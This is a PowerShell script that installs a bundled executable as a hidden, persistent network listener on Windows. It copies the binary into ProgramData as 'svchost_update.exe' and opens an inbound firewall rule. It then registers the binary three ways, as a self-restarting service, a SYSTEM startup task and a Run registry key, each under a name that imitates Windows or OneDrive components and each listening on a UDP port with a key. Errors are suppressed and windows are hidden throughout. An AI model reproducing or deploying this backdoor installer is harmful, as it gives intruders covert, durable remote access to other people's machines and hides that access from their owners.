param ([Parameter(Mandatory=$false)][SecureString]$SecurePassword)
$ErrorActionPreference = "SilentlyContinue"

if (-not $SecurePassword) {
    try { $SecurePassword = Read-Host "Input" -AsSecureString } catch { exit 1 }
}
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
$Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
[System.Runtime.InteropServices.Marshal]::ZeroFreeBSTR($BSTR)
if (-not $Password) { exit 1 }

$bin = Join-Path $PSScriptRoot "psps.exe"
if (-not (Test-Path $bin)) { exit 1 }

$destDir = "$env:ProgramData\Microsoft\network\connections"
if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }
$dest = Join-Path $destDir "svchost_update.exe"

$svcName = "WindowsHealthCheck"
$svcPort = 53535
$taskName = "OneDriveUpdateTask"
$taskPort = 44444
$regName = "WindowsSystemUpdater"
$regPort = 6666

Import-Module NetSecurity
try { Stop-Service $svcName -Force -ErrorAction SilentlyContinue } catch {}
try { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue } catch {}
try { Stop-Process -Name "svchost_update" -Force -ErrorAction SilentlyContinue } catch {}
Start-Sleep -Seconds 1
if (Test-Path $dest) { try { Remove-Item $dest -Force -ErrorAction SilentlyContinue } catch {} }

Copy-Item -Path $bin -Destination $dest -Force

New-NetFirewallRule -DisplayName "System Update" -Direction Inbound -Program $dest -Protocol UDP -Action Allow | Out-Null

$svcArgs = "slave listen udp://*:$svcPort --ssl --key `"$Password`""
$svcBinPath = "`"$dest`" $svcArgs"
try {
    New-Service -Name $svcName -BinaryPathName $svcBinPath -DisplayName $svcName -StartupType Automatic | Out-Null
    sc.exe failure "$svcName" reset= 0 actions= restart/60000/restart/60000/restart/60000 | Out-Null
    Start-Service -Name "$svcName" -ErrorAction SilentlyContinue
} catch {}

$act = New-ScheduledTaskAction -Execute $dest -Argument "slave listen udp://*:$taskPort --ssl --key `"$Password`""
$trig = New-ScheduledTaskTrigger -AtStartup
try {
    Register-ScheduledTask -Action $act -Trigger $trig -TaskName "$taskName" -User "System" -RunLevel Highest -Force | Out-Null
    Start-ScheduledTask -TaskName "$taskName"
} catch {}

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regCmd = "`"$dest`" slave listen udp://*:$regPort --ssl --key `"$Password`""
try { Set-ItemProperty -Path $regPath -Name $regName -Value $regCmd -Force } catch {}

$runningPorts = Get-NetUDPEndpoint -LocalPort $svcPort, $taskPort, $regPort -ErrorAction SilentlyContinue | Select-Object -ExpandProperty LocalPort

if ($runningPorts -notcontains $svcPort) {
    Start-Process -FilePath $dest -ArgumentList $svcArgs -WindowStyle Hidden
}
if ($runningPorts -notcontains $regPort) {
    Start-Process -FilePath $dest -ArgumentList "slave listen udp://*:$regPort --ssl --key `"$Password`"" -WindowStyle Hidden
}

Write-Host "Service: $svcPort"
Write-Host "Task:    $taskPort"
Write-Host "Reg:     $regPort"
